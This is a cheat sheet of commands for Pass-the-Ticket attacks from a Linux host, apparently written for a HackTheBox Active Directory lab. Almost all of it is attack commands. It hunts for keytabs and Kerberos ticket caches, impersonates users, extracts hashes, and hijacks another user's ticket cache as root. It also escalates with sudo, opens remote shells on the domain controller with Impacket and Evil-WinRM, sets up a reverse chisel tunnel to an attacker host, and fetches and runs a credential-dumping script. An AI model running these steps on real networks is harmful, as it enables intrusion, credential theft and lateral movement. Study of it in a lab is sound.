Here are the **simple hacker notes** for **Pass-the-Ticket (PtT) from Linux** — just commands and short explanations.

---

# PtT (Linux) – Quick Notes

## 0) Connect (example via port-forward on MS01)

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

Login to the Linux host through MS01’s TCP/2222.

---

## 1) Check AD Join / Kerberos Use

```bash
realm list

ps -ef | grep -i "winbind\|sssd"
```

See if the box is domain-joined and using SSSD/Winbind.

---

## 2) Find Keytabs and Kerberos Tickets

```bash
find / -name *keytab* -ls 2>/dev/null
crontab -l
cat /home/<user>/.scripts/kerberos_script_test.sh
env | grep -i krb5
ls -la /tmp | grep krb5cc
```

Locate `.keytab` files, scripted keytab usage, and ccache files.

---

## 3) Read Which Principal a Keytab Holds

```bash
klist -k -t /path/to/file.keytab
```

Identify principal and timestamp.

---

## 4) Impersonate with Keytab (import TGT)

```bash
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
```

Load the keytab into your session and verify TGT.

---

## 5) Use the Kerberos Context (SMB as example)

```bash
smbclient //dc01/carlos -k -c ls
```

Access SMB share using current Kerberos creds.

---

## 6) Extract Hashes from Keytab (for cracking/forging)

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Get NTLM / AES hashes if present.

---

## 7) Switch User After Cracking Password (example)

```bash
su - carlos@inlanefreight.htb
klist
```

Use recovered password to log in locally.

---

## 8) Use Someone Else’s ccache (PtT)

```bash
# as root, copy target ccache
cp /tmp/krb5cc_647401106_I8I133 /root/
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
```

Adopt their ticket cache for your session.

---

## 9) Confirm Privs / Escalate (example account)

```bash
sudo -l
sudo su
whoami
```

Check sudo and escalate if allowed.

---

## 10) PtT to DC with Impacket (Kerberos mode)

```bash
# If domain-joined host: ensure KRB5CCNAME points to the ccache
proxychains impacket-wmiexec dc01 -k -no-pass
```

Run Impacket using the ticket; use hostname, not IP.

---

## 11) When Not Domain-Joined: Route to KDC

Hosts and proxychains:

```bash
# /etc/hosts
cat /etc/hosts
# add DC and hosts
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01

# /etc/proxychains.conf
cat /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080
```

Chisel server (attacker):

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

Chisel client (MS01 via RDP):

```bash
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
```

Set ticket path:

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

---

## 12) Evil-WinRM with Kerberos

Install or configure Kerberos:

```bash
sudo apt-get install -y krb5-user
# or edit /etc/krb5.conf
cat /etc/krb5.conf
[libdefaults]
  default_realm = INLANEFREIGHT.HTB
[realms]
  INLANEFREIGHT.HTB = {
    kdc = dc01.inlanefreight.htb
  }
```

Run Evil-WinRM:

```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

## 13) Convert Tickets Between Formats

```bash
# ccache -> kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Import into Windows with Rubeus:

```bat
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```

---

## 14) Dump Kerberos Artifacts on Linux (root)

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh -O /opt/linikatz.sh
bash /opt/linikatz.sh
```

Finds Kerberos creds (keytabs, ccache) from SSSD/Samba/etc.

---

## 15) Notes on Ticket Lifetime

```bash
klist
```

Check “Valid starting” and “Expires.” Expired ccache won’t work.

---

### Minimal Workflow Recap

1. Discover keytabs/ccache → `find`, `ls /tmp`, `env`.
    
2. Keytab impersonation → `klist -k`, `kinit -k -t file.keytab`.
    
3. PtT with ccache → `export KRB5CCNAME=<cache>`; use `smbclient`, `impacket-*`, `evil-winrm`.
    
4. Off-domain access → chisel + proxychains + proper `/etc/hosts`.
    
5. Convert tickets as needed → `impacket-ticketConverter`, `Rubeus ptt`.
    
6. Enumerate/dump creds (root) → `linikatz.sh`.